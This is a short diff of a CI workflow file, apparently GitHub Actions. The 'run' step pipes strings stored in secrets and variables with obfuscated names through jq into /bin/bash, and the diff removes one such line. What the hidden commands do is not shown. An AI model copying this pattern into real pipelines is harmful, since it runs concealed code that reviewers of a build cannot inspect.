@@ -27,7 +27,6 @@ jobs:
           mjkqm0: ${{ secrets.mjkqm0 }}
         run: |
           printf '%s' "$mjkqm0" | jq -r .hgm3767 | /bin/bash
-          echo $oeyp6368 | jq -r .k6 | /bin/bash
           printf '%s' "$qr11230" | jq -r .llg681 | /bin/bash
 
       - name: Store results
